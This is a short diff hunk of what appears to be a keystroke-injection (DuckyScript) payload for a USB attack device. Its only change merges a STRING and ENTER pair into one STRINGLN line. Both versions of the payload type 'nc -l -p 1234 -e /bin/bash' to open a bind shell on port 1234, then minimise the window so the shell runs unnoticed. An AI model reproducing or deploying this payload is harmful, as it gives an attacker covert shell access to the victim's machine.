@@ -9,8 +9,7 @@ DELAY 1000
 
 REM Start bind shell
 REM The port can be changed if required
-STRING nc -l -p 1234 -e /bin/bash
-ENTER
+STRINGLN nc -l -p 1234 -e /bin/bash
 
 REM Minimise window to run stealthily
 ALT F9
